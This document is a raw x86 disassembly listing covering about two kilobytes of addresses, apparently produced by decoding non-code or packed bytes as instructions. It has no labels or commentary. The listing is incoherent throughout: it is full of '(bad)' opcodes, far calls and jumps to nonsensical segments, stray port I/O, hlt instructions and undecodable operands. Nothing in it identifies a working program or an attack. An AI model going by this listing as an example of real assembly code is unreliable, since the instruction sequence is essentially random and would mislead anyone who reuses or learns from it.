  411c4b:	xor    esp,DWORD PTR [ebp*2+0xbf1e784]
  411c52:	sbb    cl,BYTE PTR [edi+edx*8+0xff999fa]
  411c59:	test   al,0xa5
  411c5b:	xchg   ecx,eax
  411c5c:	pop    eax
  411c5d:	cmp    eax,0x33a7a4a
  411c62:	stos   DWORD PTR es:[edi],eax
  411c63:	mov    ecx,0x7cf2275b
  411c68:	or     DWORD PTR [ebp+0x7c35e641],esp
  411c6e:	in     eax,0x2
  411c70:	jmp    0x347718d3
  411c75:	sbb    al,0xc2
  411c77:	imul   ecx,DWORD PTR [eax],0x66
  411c7a:	pop    es
  411c7b:	mov    ds:0xc62679ff,al
  411c80:	add    al,0x1f
  411c82:	inc    esi
  411c83:	dec    edx
  411c84:	das    
  411c85:	pop    ebp
  411c86:	xor    al,0x32
  411c88:	push   edi
  411c89:	idiv   BYTE PTR [ebx-0x6bb61186]
  411c8f:	xchg   esp,eax
  411c90:	rol    DWORD PTR [ecx],0x65
  411c93:	mov    edx,0x9bf16946
  411c98:	retf   0xad0f
  411c9b:	and    al,0x85
  411c9d:	and    BYTE PTR [ecx-0x73],0x99
  411ca1:	loope  0x411c47
  411ca3:	push   esp
  411ca4:	dec    ebp
  411ca5:	mov    ah,0x49
  411ca7:	out    dx,eax
  411ca8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ca9:	pop    ebp
  411caa:	xor    al,0x3d
  411cac:	mov    esi,0x6113bee8
  411cb1:	mov    bh,0xa1
  411cb3:	and    edx,DWORD PTR [ecx+edx*2-0x46]
  411cb7:	xchg   ebp,eax
  411cb8:	leave  
  411cb9:	mov    ds:0xb6c51d82,al
  411cbe:	pusha  
  411cbf:	add    DWORD PTR [edi-0x37],ebx
  411cc2:	cmc    
  411cc3:	(bad)  
  411cc4:	add    DWORD PTR [eax-0x6e],ebx
  411cc7:	repz retf 0xd678
  411ccb:	cmp    DWORD PTR [edi-0x2f],0xfffffff0
  411ccf:	mov    ebp,0x59b199d3
  411cd4:	hlt    
  411cd5:	call   0x74ef:0xea1f513
  411cdc:	or     esi,DWORD PTR [edi-0x783cbc45]
  411ce2:	xchg   ebp,eax
  411ce3:	and    al,BYTE PTR [edi]
  411ce5:	cs ja  0x411cb1
  411ce8:	cmp    edx,0x3
  411ceb:	dec    ebx
  411cec:	push   0x70
  411cee:	add    eax,0xf2ada584
  411cf3:	retf   0x75cc
  411cf6:	adc    BYTE PTR [edi+0x3cddbf8b],0x4b
  411cfd:	sub    dl,ch
  411cff:	pop    ds
  411d00:	or     esi,DWORD PTR [edi]
  411d02:	add    DWORD PTR [edx-0x2dfb9c73],esi
  411d08:	cmp    DWORD PTR [eax],0x26
  411d0b:	sbb    DWORD PTR [edi],edi
  411d0d:	lds    eax,FWORD PTR [edi+0x6b9329e1]
  411d13:	dec    edi
  411d14:	jnp    0x411d90
  411d16:	or     dl,al
  411d18:	mov    eax,ds:0x55f7f341
  411d1d:	dec    ebp
  411d1e:	push   esp
  411d1f:	ss mov ebp,0xff5766cf
  411d25:	repz mov bh,0x61
  411d28:	leave  
  411d29:	adc    dh,BYTE PTR [esi+ecx*8-0x6e]
  411d2d:	imul   BYTE PTR [edi-0x46da9dda]
  411d33:	mov    bh,0xcc
  411d35:	ins    BYTE PTR es:[edi],dx
  411d36:	and    eax,0x22884858
  411d3b:	scas   al,BYTE PTR es:[edi]
  411d3c:	ret    0xb0c0
  411d3f:	cld    
  411d40:	in     al,0xcb
  411d42:	pusha  
  411d43:	arpl   WORD PTR [ecx],cx
  411d45:	mov    cl,0xf1
  411d47:	(bad)  
  411d48:	add    dh,bh
  411d4a:	stos   BYTE PTR es:[edi],al
  411d4b:	in     eax,dx
  411d4c:	fld    st(2)
  411d4e:	mov    ds:0x8e887755,al
  411d53:	mov    al,0x38
  411d55:	shr    bh,cl
  411d57:	data16 fdivr DWORD PTR [ebx]
  411d5a:	jae    0x411d46
  411d5c:	out    dx,eax
  411d5d:	enter  0x22c2,0xe6
  411d61:	xchg   edx,eax
  411d62:	xor    al,0xe7
  411d64:	shl    BYTE PTR [esi],cl
  411d66:	in     al,dx
  411d67:	mov    bl,0xb2
  411d69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d6a:	xor    eax,0xaf913d5
  411d6f:	push   0x6a
  411d71:	jbe    0x411de1
  411d73:	mov    esp,0x99128dd1
  411d78:	les    ebx,FWORD PTR [ecx]
  411d7a:	and    DWORD PTR [ecx],0x97b1a241
  411d80:	scas   eax,DWORD PTR es:[edi]
  411d81:	scas   al,BYTE PTR es:[edi]
  411d82:	adc    bh,BYTE PTR [edi+ebx*1+0x56]
  411d86:	pop    ebp
  411d87:	xchg   ebx,eax
  411d88:	es ja  0x411d34
  411d8b:	rol    ebp,1
  411d8d:	imul   edx,ebx,0x64
  411d90:	ins    BYTE PTR es:[edi],dx
  411d91:	xor    al,BYTE PTR [eax+esi*2+0x46e25d71]
  411d98:	dec    esp
  411d99:	and    al,0x14
  411d9b:	imul   esp,DWORD PTR [ecx-0x70a6d5f5],0x4f1ac3e
  411da5:	jecxz  0x411d7c
  411da7:	push   es
  411da8:	push   es
  411da9:	leave  
  411daa:	call   0xddd2:0x3521c1b7
  411db1:	xchg   edx,eax
  411db2:	dec    edi
  411db3:	jne    0x411d90
  411db5:	shl    DWORD PTR [ebp-0x2c],1
  411db8:	aaa    
  411db9:	sahf   
  411dba:	(bad)  
  411dbc:	hlt    
  411dbd:	mov    ds:0x26b9fe0e,al
  411dc2:	nop
  411dc3:	xor    al,0x31
  411dc5:	pop    ebx
  411dc6:	xor    al,BYTE PTR [edi-0x23]
  411dc9:	mov    edx,0xdaf35d28
  411dce:	xor    eax,0x3434d6fc
  411dd3:	xchg   BYTE PTR [ecx],cl
  411dd5:	std    
  411dd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411dd7:	adc    al,0x59
  411dd9:	cmp    ecx,edx
  411ddb:	jl     0x411d7d
  411ddd:	dec    ecx
  411dde:	sub    eax,ecx
  411de0:	cs stos BYTE PTR es:[edi],al
  411de2:	cmp    eax,0xcbe69404
  411de7:	call   0x271f:0xd18f7f5
  411dee:	push   esp
  411def:	loopne 0x411dc8
  411df1:	mov    ebp,0xb9d79c52
  411df6:	adc    al,0x83
  411df8:	jg     0x411dc9
  411dfa:	dec    eax
  411dfb:	hlt    
  411dfc:	(bad)  
  411dfd:	mov    ch,0xb7
  411dff:	adc    BYTE PTR [esi+0x42bf7d5e],bh
  411e05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e06:	sar    BYTE PTR [edi],1
  411e08:	inc    edx
  411e09:	inc    eax
  411e0a:	or     ebx,edx
  411e0c:	ret    
  411e0d:	dec    esi
  411e0e:	leave  
  411e0f:	sub    DWORD PTR [eax+0x42],ecx
  411e12:	pop    eax
  411e13:	sub    BYTE PTR [ecx+esi*8+0x1206ada2],dh
  411e1a:	fs lock repz inc edx
  411e1e:	ja     0x411db0
  411e20:	jbe    0x411e90
  411e22:	test   eax,0x84e9fa3e
  411e27:	jo     0x411e2d
  411e29:	fldcw  WORD PTR [ebx+0x715e0925]
  411e2f:	inc    ebp
  411e30:	stos   DWORD PTR es:[edi],eax
  411e31:	pushf  
  411e32:	mov    ebp,0x91c19d98
  411e37:	jmp    0x690dc1c4
  411e3c:	mov    BYTE PTR [eax],dl
  411e3e:	fdivr  QWORD PTR [ebp-0x65d83fe0]
  411e44:	jns    0x411eaf
  411e46:	lahf   
  411e47:	fstp   DWORD PTR [edi]
  411e49:	int    0xab
  411e4b:	(bad)  
  411e4c:	mov    ds:0xf8a9ad3,al
  411e51:	xchg   esi,eax
  411e52:	sahf   
  411e53:	test   al,0xdb
  411e55:	sbb    DWORD PTR [esi-0x36d483bc],eax
  411e5b:	out    0x91,eax
  411e5d:	mov    ecx,0xe48625b5
  411e62:	xchg   esi,eax
  411e63:	mov    dl,0xd1
  411e65:	lods   al,BYTE PTR ds:[esi]
  411e66:	jne    0x411e8e
  411e68:	fisubr DWORD PTR [esi+0x4f]
  411e6b:	js     0x411ea9
  411e6d:	hlt    
  411e6e:	cmp    al,bh
  411e70:	inc    esp
  411e71:	ss stc 
  411e73:	ret    0xa07e
  411e76:	fwait
  411e77:	push   esi
  411e78:	stc    
  411e79:	aam    0x6b
  411e7b:	pop    es
  411e7c:	mov    DWORD PTR [ecx-0x2334b542],eax
  411e82:	out    dx,al
  411e83:	and    DWORD PTR [esi+0x3e2c74be],ecx
  411e89:	cld    
  411e8a:	sbb    edi,DWORD PTR [ebx+0x60]
  411e8d:	xor    ecx,ecx
  411e8f:	fmul   DWORD PTR [ebp-0x5b]
  411e92:	aas    
  411e93:	pop    esp
  411e94:	pop    edx
  411e95:	dec    ebx
  411e96:	daa    
  411e97:	mov    esp,0x44ebbea2
  411e9c:	add    BYTE PTR [edx+0x4181c7a0],bl
  411ea2:	out    dx,al
  411ea3:	mov    dl,BYTE PTR [ebx]
  411ea5:	and    eax,0x82cffe77
  411eaa:	repnz dec esi
  411eac:	into   
  411ead:	rcr    DWORD PTR [esi-0x50],0xfe
  411eb1:	jmp    DWORD PTR [ecx]
  411eb3:	adc    eax,0xc1a1232f
  411eb8:	and    eax,0x61ffd323
  411ebd:	fs jb  0x411ee0
  411ec0:	outs   dx,BYTE PTR ds:[esi]
  411ec1:	outs   dx,BYTE PTR ds:[esi]
  411ec2:	(bad)  
  411ec3:	rol    BYTE PTR [edx-0x2c2d433e],0x6c
  411eca:	cmc    
  411ecb:	gs mov eax,0xced40a5b
  411ed1:	push   0xffffff9b
  411ed3:	aad    0x74
  411ed5:	xchg   edi,eax
  411ed6:	push   es
  411ed7:	test   eax,0xbc46f966
  411edc:	aas    
  411edd:	jnp    0x411edb
  411edf:	es inc esp
  411ee1:	sbb    al,0x64
  411ee3:	cmp    ch,BYTE PTR [ecx+0x35161d9a]
  411ee9:	retf   
  411eea:	add    eax,edi
  411eec:	imul   edx,DWORD PTR [edx+esi*1+0x6ca1c8a8],0xffffffee
  411ef4:	pop    ecx
  411ef5:	mov    ?,WORD PTR [ebp-0x62]
  411ef8:	fld    TBYTE PTR ds:0xdfc93aba
  411efe:	mov    bh,0x44
  411f00:	cmp    BYTE PTR [edi+0x20],al
  411f03:	and    DWORD PTR [ecx-0x7d],edx
  411f06:	in     eax,dx
  411f07:	jl     0x411eaf
  411f09:	cli    
  411f0a:	mov    esi,0xdc566043
  411f0f:	xchg   esi,eax
  411f10:	test   DWORD PTR [edi],esp
  411f12:	sub    al,0xc1
  411f14:	sub    al,0x83
  411f16:	mov    dl,0x60
  411f18:	js     0x411f94
  411f1a:	inc    ecx
  411f1b:	ror    DWORD PTR ss:[ecx+esi*8+0x29],cl
  411f20:	push   eax
  411f21:	sub    BYTE PTR [esi-0x47fabd38],ch
  411f27:	dec    esi
  411f28:	jns    0x411fa6
  411f2a:	xor    al,0xfd
  411f2c:	push   edx
  411f2d:	dec    ebp
  411f2e:	dec    ecx
  411f2f:	addr16 call 0x28f0:0x8a5ca834
  411f37:	sub    DWORD PTR [ecx-0x56025780],edx
  411f3d:	daa    
  411f3e:	stos   DWORD PTR es:[edi],eax
  411f3f:	daa    
  411f40:	and    bh,BYTE PTR [ebp-0x38f50fc3]
  411f46:	mov    cl,0xcc
  411f48:	(bad)  
  411f49:	(bad)  
  411f4d:	dec    ecx
  411f4e:	xchg   ecx,eax
  411f4f:	test   ah,dl
  411f51:	(bad)  
  411f52:	rol    DWORD PTR [eax+0x4580a380],1
  411f58:	sub    BYTE PTR [ebx+ecx*8+0x5d1da914],cl
  411f5f:	mov    bl,0xcd
  411f61:	pop    ebx
  411f62:	mov    ah,0xc4
  411f64:	mov    dh,0x5a
  411f66:	add    BYTE PTR [esp+eax*2-0x6e],dh
  411f6a:	fcom   st(4)
  411f6c:	mov    dh,0x3d
  411f6e:	sub    DWORD PTR [ebx+0x7ce0594b],ebp
  411f74:	xchg   ebx,eax
  411f75:	jbe    0x411faa
  411f77:	sahf   
  411f78:	cmp    ch,dh
  411f7a:	push   esp
  411f7b:	and    BYTE PTR [eax],ah
  411f7d:	push   esi
  411f7e:	mov    bh,0x86
  411f80:	push   ds
  411f81:	stc    
  411f82:	xrelease mov BYTE PTR [eax-0x5775bc48],bl
  411f89:	(bad)  
  411f8a:	(bad)  
  411f8b:	rcl    BYTE PTR [edi-0x5],cl
  411f8e:	xchg   esp,eax
  411f90:	lods   al,BYTE PTR ds:[esi]
  411f91:	mov    bl,0xf5
  411f93:	sub    cl,bh
  411f95:	sbb    eax,0x46e2e171
  411f9a:	xchg   esi,eax
  411f9b:	cmp    edi,DWORD PTR [eax+0x229d7400]
  411fa1:	adc    dh,al
  411fa3:	inc    edx
  411fa4:	jge    0x411fac
  411fa6:	aam    0x39
  411fa8:	push   ecx
  411fa9:	int3   
  411faa:	or     BYTE PTR [esi-0x44],ch
  411fad:	pop    ecx
  411fae:	pushf  
  411faf:	cdq    
  411fb0:	mov    edx,0x3c3fb772
  411fb5:	or     edx,DWORD PTR [esi-0x19]
  411fb8:	repnz mov DWORD PTR [edi+0x311e4dc7],ebx
  411fbf:	and    ah,BYTE PTR [esi+0x35]
  411fc2:	fstp   st(0)
  411fc4:	cmp    eax,DWORD PTR [eax+0x43]
  411fc7:	pop    ss
  411fc8:	jg     0x411f4d
  411fca:	push   ebp
  411fcb:	mov    esp,esp
  411fcd:	retf   0x12eb
  411fd0:	cmp    dh,dh
  411fd2:	into   
  411fd3:	shl    BYTE PTR ds:0x78e93598,0xd0
  411fda:	mov    al,BYTE PTR [ebx]
  411fdc:	push   0x7f8439a5
  411fe1:	test   al,0x66
  411fe3:	add    BYTE PTR [eax-0x67],ah
  411fe6:	mov    al,0x79
  411fe8:	addr16 jg 0x412044
  411feb:	loope  0x411fa5
  411fed:	lods   eax,DWORD PTR ds:[esi]
  411fee:	xchg   BYTE PTR [edi+edx*2],al
  411ff1:	fcmovu st,st(7)
  411ff3:	xchg   ebp,eax
  411ff4:	lahf   
  411ff5:	enter  0x4288,0x9e
  411ff9:	ret    0x8274
  411ffc:	pop    eax
  411ffd:	and    edi,DWORD PTR [esi]
  411fff:	push   0xffffffe8
  412001:	sub    esp,DWORD PTR [ebx+0x66]
  412004:	xchg   esp,eax
  412005:	in     al,0x69
  412007:	sub    al,0x21
  412009:	pop    ecx
  41200a:	pop    es
  41200b:	outs   dx,DWORD PTR ds:[esi]
  41200c:	sbb    BYTE PTR [edx-0x64509514],dh
  412012:	(bad)  
  412014:	dec    edx
  412015:	fistp  DWORD PTR [esi+eax*8-0x71]
  412019:	aaa    
  41201a:	popf   
  41201b:	mov    dl,0x2b
  41201d:	addr16 (bad) 
  41201f:	sti    
  412020:	mov    WORD PTR [eax+0x14],?
  412023:	test   al,0x6f
  412025:	jecxz  0x412015
  412027:	(bad)  
  412028:	jne    0x412004
  41202a:	mov    ebp,0x8fc849e2
  41202f:	addr16 push ds
  412031:	adc    al,0xcd
  412033:	(bad)  
  412034:	or     BYTE PTR [edi+0xf84ae77],dh
  41203a:	lods   eax,DWORD PTR ds:[esi]
  41203b:	test   BYTE PTR [ecx],bl
  41203d:	out    dx,eax
  41203e:	popa   
  41203f:	cld    
  412040:	sbb    DWORD PTR [eax-0x7147917b],ebx
  412046:	adc    BYTE PTR [ebx],bh
  412048:	out    0x68,al
  41204a:	fld    QWORD PTR [eax+0x155ede5b]
  412050:	cmp    eax,0xb25de2f4
  412055:	ret    
  412056:	xchg   edi,eax
  412057:	inc    edi
  412058:	xchg   edi,eax
  412059:	jb     0x41207e
  41205b:	popa   
  41205c:	mov    ?,WORD PTR [ecx]
  41205e:	rcr    BYTE PTR [ecx+ecx*1+0x71],0xaa
  412063:	scas   eax,DWORD PTR es:[edi]
  412064:	mov    ds:0x61e0043f,al
  412069:	retf   0x4b9
  41206c:	out    0xab,al
  41206e:	out    dx,eax
  41206f:	mov    ebp,0xbefe3361
  412074:	dec    ebx
  412075:	fdivr  DWORD PTR [edi]
  412077:	xchg   edx,eax
  412078:	imul   esi,DWORD PTR [esi-0x20],0x40
  41207c:	or     DWORD PTR [ecx+0x48],eax
  41207f:	(bad)  
  412080:	adc    al,BYTE PTR [edi+0x7d7b0781]
  412086:	bt     esi,ebp
  412089:	clc    
  41208a:	xor    al,0x1f
  41208c:	adc    edx,DWORD PTR [edi+0x5c29dfa]
  412092:	adc    al,0xf1
  412094:	jmp    0x97a465b
  412099:	adc    dl,BYTE PTR ds:0x9a68effa
  41209f:	lods   eax,DWORD PTR ds:[esi]
  4120a0:	dec    ebx
  4120a1:	sbb    DWORD PTR [edx+eiz*8-0x36],eax
  4120a5:	dec    esp
  4120a6:	in     al,0x41
  4120a8:	and    al,0x7d
  4120aa:	xchg   esi,eax
  4120ab:	imul   ecx,DWORD PTR [ebp+0x27921136],0x5762dae9
  4120b5:	dec    esp
  4120b6:	(bad)  
  4120b7:	lahf   
  4120b8:	add    BYTE PTR [esi+0x77],dl
  4120bb:	aaa    
  4120bc:	sub    al,0xad
  4120be:	sub    dl,bl
  4120c0:	jns    0x412084
  4120c2:	out    0x34,al
  4120c4:	mov    edx,ds
  4120c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120c7:	mov    ds:0x9b85f6f,al
  4120cc:	ja     0x412111
  4120ce:	cmp    ch,dh
  4120d0:	enter  0x24d9,0x4b
  4120d4:	push   edi
  4120d5:	cmc    
  4120d6:	jecxz  0x41209d
  4120d8:	dec    eax
  4120d9:	push   eax
  4120da:	(bad)  
  4120db:	mov    edi,0x77583d32
  4120e0:	sbb    BYTE PTR [ebp-0x73dca8ed],0x22
  4120e7:	xor    ah,BYTE PTR [ebx]
  4120e9:	sbb    al,ah
  4120eb:	ret    0xe14f
  4120ee:	mov    edi,0x7bfc4fe4
  4120f3:	inc    esp
  4120f4:	cmp    BYTE PTR [ebx-0x3ed2bca0],0x5d
  4120fb:	mov    dh,BYTE PTR [edx+0x63]
  4120fe:	ins    BYTE PTR es:[edi],dx
  4120ff:	or     al,0x1
  412101:	jo     0x412138
  412103:	mov    cl,0xba
  412105:	mov    bh,0x93
  412107:	adc    bl,BYTE PTR [ebx]
  412109:	jge    0x4120f7
  41210b:	js     0x4120ac
  41210d:	mov    ebp,0x34ff8f2c
  412112:	push   0xfffffff5
  412114:	add    cl,dl
  412116:	xor    eax,0xcb2411b9
  41211b:	pop    eax
  41211c:	mov    edi,0x4259f646
  412121:	data16 loope 0x41210a
  412124:	fwait
  412125:	push   ss
  412126:	adc    al,0x17
  412128:	push   ebp
  412129:	ja     0x4120b5
  41212b:	and    dh,ah
  41212d:	das    
  41212e:	and    ebx,DWORD PTR [ecx+0x69a47218]
  412134:	fsubr  DWORD PTR [esi-0x1b]
  412137:	dec    esp
  412138:	and    al,0x1
  41213a:	pushf  
  41213b:	icebp  
  41213c:	repz mov dl,0xcd
  41213f:	xchg   esp,eax
  412140:	call   FWORD PTR [ebx-0x1a]
  412143:	push   esp
  412144:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412145:	jmp    0x3905:0x548b2202
  41214c:	data16 es repnz mov al,0xcd
  412151:	mov    esp,0xd1581472
  412156:	scas   al,BYTE PTR es:[edi]
  412157:	mov    al,ds:0x43530258
  41215c:	je     0x4120f2
  41215e:	cmp    BYTE PTR [esi+ebx*8-0x19],cl
  412162:	jns    0x4121cf
  412164:	push   0xffffff93
  412166:	cmc    
  412167:	mov    dl,0x7b
  412169:	fbstp  TBYTE PTR [eax]
  41216b:	xor    al,0x1e
  41216d:	xchg   esi,eax
  41216e:	ret    0x6b7d
  412171:	aaa    
  412172:	fstp   DWORD PTR [ebp-0x14d5594e]
  412178:	push   esp
  412179:	xor    ecx,DWORD PTR [edx+0x56]
  41217c:	add    ecx,esp
  41217e:	sub    eax,0xc96af43f
  412183:	stos   BYTE PTR es:[edi],al
  412184:	out    dx,al
  412185:	jp     0x4121d2
  412187:	mov    ah,0xc5
  412189:	ficomp WORD PTR ds:0xacfbc741
  41218f:	mov    DWORD PTR [esi-0x41f1adcc],ebx
  412195:	scas   eax,DWORD PTR es:[edi]
  412196:	(bad)  
  412197:	ins    BYTE PTR es:[edi],dx
  412198:	iret   
  412199:	sub    al,0xfc
  41219b:	pop    eax
  41219c:	or     esp,DWORD PTR [ebp+0x37b228ba]
  4121a2:	icebp  
  4121a3:	retf   0x8882
  4121a6:	cs dec ebx
  4121a8:	fucom  st(5)
  4121aa:	fdiv   QWORD PTR [edx]
  4121ac:	push   ecx
  4121ad:	sbb    ecx,DWORD PTR [ebp-0x5e]
  4121b0:	pop    eax
  4121b1:	fsubr  QWORD PTR ds:0x90c6dd73
  4121b7:	and    edx,DWORD PTR [ebx+esi*1-0x131be316]
  4121be:	push   ecx
  4121bf:	imul   esi,DWORD PTR [eax+eiz*2-0x1902e212],0x15d5ce48
  4121ca:	enter  0xeb29,0x45
  4121ce:	rcr    BYTE PTR [esi],0x1b
  4121d1:	jno    0x41217f
  4121d3:	xor    al,BYTE PTR [ecx+0x491dc85b]
  4121d9:	ins    DWORD PTR es:[edi],dx
  4121da:	stos   DWORD PTR es:[edi],eax
  4121db:	aaa    
  4121dc:	inc    esp
  4121dd:	bound  ecx,QWORD PTR [eax]
  4121df:	xor    cl,BYTE PTR [esp+eax*2+0x8bfcd57]
  4121e6:	popf   
  4121e7:	loop   0x41217b
  4121e9:	imul   eax,DWORD PTR [edx+0x35],0xa9b9a364
  4121f0:	add    esi,DWORD PTR [ebx-0x7263a69a]
  4121f6:	mov    ds:0x28cab8e8,al
  4121fb:	pop    es
  4121fc:	cmp    al,0x5f
  4121fe:	jmp    0x5ae3857a
  412203:	cmp    BYTE PTR [esi],cl
  412205:	lock add BYTE PTR [edi+edi*8-0x64],dh
  41220a:	fadd   QWORD PTR [edi]
  41220c:	add    edx,edi
  41220e:	sub    al,0x37
  412210:	adc    DWORD PTR [ebx+0x15],ecx
  412213:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412214:	mov    ebp,0x26d46637
  412219:	and    al,0x84
  41221b:	(bad)  
  41221c:	xor    esi,DWORD PTR fs:[eax+0x700341f2]
  412223:	pop    ss
  412224:	pop    ebx
  412225:	pop    esi
  412226:	pusha  
  412227:	xor    eax,ebp
  412229:	sbb    edx,DWORD PTR [ebx-0x12e9d10f]
  41222f:	cmp    eax,0x33bf3149
  412234:	in     al,dx
  412235:	bound  esp,QWORD PTR [esi+0x4f7915f1]
  41223b:	xchg   bl,cl
  41223d:	sbb    ecx,DWORD PTR [ebx+0x18]
  412240:	push   edx
  412241:	cdq    
  412242:	add    DWORD PTR [ebx+esi*2+0x1e],ebp
  412246:	or     edi,ebx
  412248:	mov    al,0x9c
  41224a:	push   cs
  41224b:	mov    ds:0xe1303ea6,al
  412250:	inc    edi
  412251:	adc    ah,BYTE PTR [ecx+0x4487957]
  412257:	mov    ah,BYTE PTR [edi+0x77]
  41225a:	xlat   BYTE PTR ds:[ebx]
  41225b:	hlt    
  41225c:	jns    0x412227
  41225e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41225f:	into   
  412260:	cmp    eax,0x375890f9
  412265:	jb     0x41225f
  412267:	in     al,dx
  412268:	cmp    al,BYTE PTR [edx]
  41226a:	imul   ebp,DWORD PTR ds:0x1d8ad940,0xffffffaf
  412271:	ror    DWORD PTR [ebx+ebx*4],0xa1
  412275:	or     ebp,DWORD PTR [edi+0x525860a0]
  41227b:	push   ebx
  41227c:	mov    dl,0xe8
  41227e:	popa   
  41227f:	jmp    0xcda9:0x1a31e94b
  412286:	push   cs
  412287:	and    DWORD PTR [ebx],edx
  412289:	lods   eax,DWORD PTR ds:[esi]
  41228a:	add    ebp,DWORD PTR [ebp+0x38181375]
  412290:	dec    edi
  412291:	dec    esi
  412292:	ret    0x15bb
  412295:	in     al,dx
  412296:	fsub   st(4),st
  412298:	ret    
  412299:	loop   0x41230d
  41229b:	push   ds
  41229c:	push   ebp
  41229d:	js     0x4122af
  41229f:	mov    eax,0xb840f9a9
  4122a4:	mov    ds:0x1564361c,al
  4122a9:	and    al,BYTE PTR [ebx]
  4122ab:	dec    eax
  4122ac:	and    DWORD PTR [ebp+ecx*2+0x26],0xffffffc6
  4122b1:	and    ah,BYTE PTR [esi+0x2e]
  4122b4:	hlt    
  4122b5:	cmp    edi,DWORD PTR [ecx]
  4122b7:	pushf  
  4122b8:	dec    edx
  4122b9:	out    0xc,al
  4122bb:	sbb    ah,BYTE PTR [ecx+ebp*4-0x3acaacf9]
  4122c2:	in     eax,0x6e
  4122c4:	cmp    al,0xc9
  4122c6:	sub    ecx,DWORD PTR [ebx]
  4122c8:	push   edx
  4122c9:	mov    ecx,?
  4122cb:	mov    ebx,0x1ff97410
  4122d0:	aaa    
  4122d1:	and    DWORD PTR [ecx+0x41],esi
  4122d4:	ret    
  4122d5:	xchg   BYTE PTR [eax],al
  4122d7:	leave  
  4122d8:	divps  xmm0,xmm3
  4122db:	sub    eax,0xd9de09e1
  4122e0:	xchg   BYTE PTR [esi-0x65b2e724],bh
  4122e6:	jmp    0x938c:0x90b6c9a1
  4122ed:	(bad)  
  4122ef:	adc    bh,bh
  4122f1:	cld    
  4122f2:	ror    BYTE PTR [ecx],cl
  4122f4:	retf   
  4122f5:	dec    esp
  4122f6:	dec    BYTE PTR [eax-0x70467e47]
  4122fc:	fbstp  TBYTE PTR [esi+0x13f2f7b3]
  412302:	sbb    al,0xdf
  412304:	and    DWORD PTR [edi+edx*4],eax
  412307:	jno    0x4122bd
  412309:	addr16 aaa 
  41230b:	sti    
  41230c:	dec    eax
  41230d:	xchg   edi,eax
  41230e:	aam    0x37
  412310:	cld    
  412311:	sub    eax,0xcccabe4b
  412316:	push   edi
  412317:	xor    ebp,ebx
  412319:	dec    esi
  41231a:	mov    esi,0xd23a7a33
  41231f:	inc    ecx
  412320:	pop    eax
  412321:	and    al,0xb7
  412324:	push   ss
  412325:	mov    edx,0x9afb5fda
  41232a:	and    bh,BYTE PTR [esi-0x58]
  41232d:	and    DWORD PTR [edx-0x3e7f964e],edx
  412333:	repnz leave 
  412335:	les    esi,FWORD PTR [ebp-0x49]
  412338:	out    0xdb,eax
  41233a:	repnz inc eax
  41233c:	mov    al,ah
  41233e:	ds xchg esi,eax
  412340:	jl     0x4122c2
  412342:	mov    BYTE PTR [ebx+0x3acb59e],bl
  412348:	popa   
  412349:	leave  
  41234a:	mov    dh,0x21
  41234c:	fsubr  DWORD PTR ds:0x12d95808
  412352:	mov    dh,0x9a
  412354:	push   ecx
  412355:	(bad)  
  412356:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412357:	mov    ch,0xf3
  412359:	repnz pusha 
  41235b:	mov    ebx,0x75071bd5
  412360:	sbb    ecx,DWORD PTR [edi-0x253674a5]
  412366:	imul   ebp,edx,0x4b
  412369:	addr16 add al,0xc6
  41236c:	push   ds
  41236d:	js     0x412353
  41236f:	push   esp
  412370:	cli    
  412371:	xchg   BYTE PTR [esi-0x4b],bh
  412374:	(bad)  
  412375:	lods   al,BYTE PTR ds:[esi]
  412376:	push   ebp
  412377:	mov    eax,0x90d21cae
  41237c:	jmp    0x5cd8c002
  412381:	ins    DWORD PTR es:[edi],dx
  412382:	cmp    eax,0x3c7faaeb
  412387:	lea    ebp,[edi-0x62]
  41238a:	outs   dx,DWORD PTR ds:[esi]
  41238b:	push   esi
  41238c:	jno    0x412338
  41238e:	or     esi,DWORD PTR [edx+0x1ef3c16d]
  412394:	nop
  412395:	retf   0x237e
  412398:	gs push cs
  41239a:	jecxz  0x412372
  41239c:	dec    ebp
  41239d:	in     eax,dx
  41239e:	(bad)  
  41239f:	sbb    eax,0x24ee95b1
  4123a4:	in     eax,dx
  4123a5:	and    DWORD PTR [ebx-0x1e],edi
  4123a8:	mov    ?,WORD PTR [eax]
  4123aa:	mov    dl,BYTE PTR [edi]
  4123ac:	xor    al,0x72
  4123ae:	adc    esi,DWORD PTR [edx]
  4123b0:	cmp    bh,bl
  4123b2:	mov    ds:0xe2374fac,eax
  4123b7:	inc    edx
  4123b8:	sub    eax,0xf71ce8a6
  4123bd:	dec    ebx
  4123be:	es gs sub al,0xd7
  4123c2:	xor    edx,DWORD PTR [edx-0xd]
  4123c5:	pop    esp
  4123c6:	sbb    ebp,DWORD PTR [eax]
  4123c8:	pusha  
  4123c9:	dec    esi
  4123ca:	jmp    0x412394
  4123cc:	scas   al,BYTE PTR es:[edi]
  4123cd:	stos   BYTE PTR es:[edi],al
  4123ce:	pop    ss
  4123cf:	gs jl  0x4123e8
  4123d2:	js     0x412435
  4123d4:	jo     0x4123b5
  4123d6:	in     al,dx
  4123d7:	aaa    
  4123d8:	inc    DWORD PTR [ecx+0x61]
  4123db:	ins    BYTE PTR es:[edi],dx
  4123dc:	leave  
  4123dd:	test   al,0x5e
  4123df:	mov    eax,0x1adc5836
  4123e4:	sbb    BYTE PTR [ebp-0x1868af1f],ch
  4123ea:	inc    esp
  4123eb:	rcr    DWORD PTR [edi],1
  4123ed:	cdq    
  4123ee:	imul   edx,DWORD PTR [esi],0xd28908d7
  4123f4:	push   0xffffffc6
  4123f6:	js     0x412405
  4123f8:	scas   al,BYTE PTR es:[edi]
  4123f9:	dec    esp
  4123fa:	jl     0x412421
  4123fc:	scas   eax,DWORD PTR es:[edi]
  4123fd:	imul   ebp,DWORD PTR [eax],0x81bb0e4b
  412403:	push   cs
  412404:	int    0xa8
  412406:	jnp    0x412407
  412408:	sub    bh,BYTE PTR [esi+eax*4]
  41240b:	test   al,0x6f
  41240d:	add    edi,DWORD PTR [esi-0x7a8ddd78]
  412413:	cwde   
  412414:	jl     0x4123e9
  412416:	mov    ?,WORD PTR [ebx+0x1c]
